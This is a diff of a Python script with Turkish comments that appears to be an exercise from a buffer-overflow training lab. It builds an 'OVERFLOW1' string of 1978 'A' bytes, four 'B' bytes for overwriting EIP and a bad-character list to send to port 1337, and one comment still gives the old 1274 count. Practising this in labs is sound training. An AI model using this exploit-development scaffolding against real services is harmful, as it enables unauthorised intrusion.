@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
 # Python 3 ile çalıştırılması gerektiğini belirtir.
 
-import sys, time, socket
+import sys 
+import time 
+import socket
+
 # 'sys', 'time' ve 'socket' modülleri:
 # - 'sys': Programın sistemle etkileşime geçmesini sağlar (örneğin, programdan çıkmak).
 # - 'time': Zamanlama işlemleri için kullanılır.
 # - 'socket': Ağ bağlantısı kurmak ve veri iletimi için kullanılır.
 
-ip = "192.168.37.131"  # Test edilecek hedefin IP adresi. Bu adresi kendi test ortamınıza göre değiştirin.
+ip = "IP_ADDRESS"  # Test edilecek hedefin IP adresi. Bu adresi kendi test ortamınıza göre değiştirin.
 port = 1337  # Hedef uygulamanın dinlediği port numarası. Bu numarayı hedefinize göre değiştirin.
 timeout = 5  # Bağlantı zaman aşımı süresi. 5 saniye boyunca yanıt alınmazsa bağlantı sonlandırılacak.
 
@@ -37,8 +40,8 @@ badchars = (
 
 prefix = "OVERFLOW1 "  # Hedef uygulamaya gönderilecek komutun ön eki. Bu uygulamaya bağlı olarak değiştirilmelidir.
 string = prefix + "A"*1978 + "B"*4 + badchars  # Gönderilecek toplam veri.
-# - prefix: "OVERFLOW3 " ile başlıyor.
-# - "A"*1274: 1274 bayt 'A' karakteri gönderiliyor. Bu buffer overflow'un test edilmesi için kullanılır.
+# - prefix: "OVERFLOW1 " ile başlıyor.
+# - "A"*1274: 1978 bayt 'A' karakteri gönderiliyor. Bu buffer overflow'un test edilmesi için kullanılır.
 # - "B"*4: EIP üzerine yazılacak 4 baytlık 'B' karakterleri.
 # - badchars: Ardından yukarıda tanımlanan tüm kötü karakterler (badchars) gönderiliyor. Bu, kötü karakterlerin hedef uygulamada sorun çıkarıp çıkarmadığını kontrol etmek için.
 
